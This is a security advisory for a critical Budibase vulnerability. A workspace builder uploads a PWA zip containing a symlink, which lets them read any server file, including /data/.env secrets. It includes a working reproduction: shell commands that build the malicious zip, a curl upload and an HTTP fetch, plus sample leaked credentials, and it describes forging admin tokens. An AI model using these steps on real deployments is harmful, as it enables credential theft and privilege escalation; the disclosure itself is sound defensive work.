# [C] Budibase has arbitrary file read by workspace-builder via PWA-zip symlink upload

## Summary
Severity: Critical
Advisory: GHSA-w7mq-r738-x278
CVE: CVE-2026-54352
CWE: CWE-22, CWE-59
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-06-22
Source: https://github.com/advisories/GHSA-w7mq-r738-x278
Type: github-advisory

## Affected
- npm: `@budibase/server` — affected >=0 <3.39.9

## Details
## Summary

`POST /api/pwa/process-zip` at `packages/server/src/api/routes/static.ts:24` accepts a builder-uploaded `.zip`, extracts it with `extract-zip@2.0.1` into a temp directory, then for each entry listed in `icons.json` validates the icon path, opens it, and streams the bytes into MinIO. The resulting object is served back via `GET /api/assets/{appId}/pwa/{uuid}.png`.

`extract-zip@2.0.1` preserves absolute symlink targets when restoring symlink entries. The icon-source validator at `packages/server/src/api/controllers/static/index.ts:259-268` resolves the icon source string against `baseDir` (`path.resolve`), checks `resolvedSrc.startsWith(baseDir + path.sep)` against that string, and calls `fs.existsSync(resolvedSrc)` which follows symbolic links to confirm the target exists. None of the three calls reject symbolic-link entries, so an entry stored at `baseDir/evil.png` but pointing at `/data/.env` passes the gate.

`packages/backend-core/src/objectStore/objectStore.ts:302` then calls `(await fsp.open(path)).createReadStream()` on the resolved path. `fsp.open` follows the symlink, the target file's bytes stream into MinIO, and the response of the asset-fetch endpoint returns those bytes verbatim.

Result: a workspace-level builder reads any file the server process can open (root inside the default Docker image, including `/data/.env` with `JWT_SECRET`, `INTERNAL_API_KEY`, `MINIO_*`, `REDIS_PASSWORD`, `COUCHDB_PASSWORD`, `DATABASE_URL`) by uploading one crafted PWA zip.

## Affected

`Budibase/budibase` server, `@budibase/server` package, `<= 3.39.0` (HEAD `feab995`, released 2026-05-20).

Reachable in stock self-hosted deployments. The default `budibase/budibase:latest` Docker image runs the Node server as `root` inside the container; the server process opens `/etc/passwd`, `/etc/shadow`, `/data/.env`, and every other root-readable file. Reachable from any account with the workspace-builder permission on at least one app.

Not affected: managed cloud-hosted Budibase tenants where the file-system root is sandboxed away from secret material.

## Root cause

`packages/server/src/api/routes/static.ts:24`: `.post("/api/pwa/process-zip", authorized(BUILDER), controller.processPWAZip)` exposes the endpoint to any workspace builder; the only permission required is `BUILDER`.

`packages/server/src/api/controllers/static/index.ts:235`: `await extract(filePath, { dir: tempDir })` calls `extract-zip@2.0.1`, which preserves absolute symlink targets when restoring symlink entries.

`packages/server/src/api/controllers/static/index.ts:259-268`: the icon validator (`path.resolve` + `resolvedSrc.startsWith(baseDir + path.sep)` + `fs.existsSync`) operates on the resolved string path and on `fs.existsSync` (which follows symbolic links). A symlink stored under `baseDir` whose target points anywhere reachable by the server passes the gate as long as the target exists.

`packages/backend-core/src/objectStore/objectStore.ts:302`: `(await fsp.open(path)).createReadStream()` follows the symlink and streams the target file's bytes; the object lands in MinIO under `{appId}/pwa/{uuid}{extension}` and is served by `GET /api/assets/{appId}/pwa/{uuid}.{ext}` (`packages/server/src/api/routes/static.ts:21`).

`hosting/single/Dockerfile`: the production single-container image runs the Node server as `root`, so the read primitive reaches `/etc/shadow`, `/data/.env`, and every other root-readable path.

## Reproduction

`budibase/budibase:latest` (`v3.39.0`) Docker single-container on `localhost:10000`, default config, with any workspace builder logged in. Cookie jar and `<CSRF>` token come from `GET /api/global/self`.

1. Builder uploads a zip containing one symlink entry that targets `/data/.env`, plus an `icons.json` that references the symlink.

```bash
mkdir attack && cd attack
ln -s /data/.env evil.png
printf '{"name":"x","icons":[{"src":"evil.png","sizes":"192x192","type":"image/png"}]}' > icons.json
zip -y attack.zip icons.json evil.png

curl -s "http://localhost:10000/api/pwa/process-zip" \
  -b cookies.txt \
  -H "x-budibase-app-id: <appId>" \
  -H "x-csrf-token: <CSRF>" \
  -F "file=@attack.zip"
```

```json
{"icons":[{"src":"<appId>/pwa/c9370128-885a-48bc-bd1c-5522f4c8020f.png","sizes":"192x192","type":"image/png"}]}
```

2. Builder fetches the resulting "icon".

```http
GET /api/assets/<appId>/pwa/c9370128-885a-48bc-bd1c-5522f4c8020f.png HTTP/1.1
Host: localhost:10000
Cookie: budibase:auth=<JWT>; budibase:auth.sig=<SIG>
```

```
COUCHDB_USER=admin
COUCHDB_PASSWORD=admin
MINIO_ACCESS_KEY=bd501fa31bf44a7e8beb6f7b628c6def
MINIO_SECRET_KEY=bf754d8f29434fc997225e10f55de778
INTERNAL_API_KEY=e9580f58b18b4371868aa3442c57522c
JWT_SECRET=c5441dc903f845bdb93a98b949a612b2
REDIS_PASSWORD=50739fb539504149a5fd85c85fe6750c
DATABASE_URL=postgresql://llmproxy:...@127.0.0.1:5432/litellm
```

Live-verified: the response body of the asset-fetch endpoint is byte-identical to `docker exec budibase cat /data/.env`; `/etc/passwd` and `/etc/shadow` extract via the same primitive when their permissions allow root reads.

## Impact

- Disclosure of `/data/.env`: `JWT_SECRET`, `INTERNAL_API_KEY`, `MINIO_ACCESS_KEY`, `MINIO_SECRET_KEY`, `REDIS_PASSWORD`, `COUCHDB_PASSWORD`, `LITELLM_MASTER_KEY`, `DATABASE_URL`.
- HS256 JWT forge with the leaked `JWT_SECRET` against any user id, including the global admin: scope-changing escalation from workspace-builder to global-admin.
- Cross-tenant exposure on multi-tenant installs once the global-admin forge succeeds.
- Disclosure of `/etc/passwd` and `/etc/shadow` via the same primitive when the container runs as `root` (the shipped default).

## Credit

Jan Kahmen, [turingpoint](https://turingpoint.de) (jan@turingpoint.de).

## References
- https://github.com/Budibase/budibase/security/advisories/GHSA-w7mq-r738-x278
- https://nvd.nist.gov/vuln/detail/CVE-2026-54352
- https://github.com/Budibase/budibase
